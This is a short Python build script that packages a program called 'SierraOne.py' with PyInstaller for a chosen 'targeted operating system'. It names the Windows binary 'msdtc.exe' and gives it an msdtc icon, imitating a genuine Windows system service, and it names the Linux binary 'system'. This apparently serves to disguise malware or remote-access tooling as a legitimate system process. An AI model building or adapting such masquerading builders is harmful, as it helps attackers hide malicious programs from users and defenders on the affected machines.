import argparse
import os
import platform
import subprocess
import sys
import time
from shutil import rmtree


dist = ""

def remove_junk():
    rmtree("build")
    rmtree("__pycache__")
    
def builder():
    if dist == "windows":
        subprocess.run(["wine", "pyinstaller", "--onefile", "--icon=images/msdtc.ico", "-n", "msdtc.exe", "SierraOne.py"])
        time.sleep(1)
        os.remove("msdtc.exe.spec")
        remove_junk()
        #subprocess.run(["rm", "-rf", "build", "__pycache__", "msdtc.exe.spec"])
        print("\nDone. Check 'dist' for your file")
    elif dist == "linux":
        subprocess.run(["pyinstaller", "--onefile", "-n", "system", "SierraOne.py"])
        time.sleep(1)
        os.remove("system.spec")
        remove_junk()
        #subprocess.run(["rm", "-rf", "build", "__pycache__", "system.spec"])
        print("\nDone. Check 'dist' for your file")
    else:
        print("Unsupported operating system")
        
    sys.exit(0)
        
def main():
    global dist
    
    parser = argparse.ArgumentParser()
    parser.add_argument("-o", "--os", metavar="", required=True, type=str, help="Targeted operating system (Windows, Linux)")

    try:
        args = parser.parse_args()

    except:
        print("Missing arguments")
        sys.exit(0)

    dist = args.os.lower()
    builder()

if __name__ == "__main__":
    main()
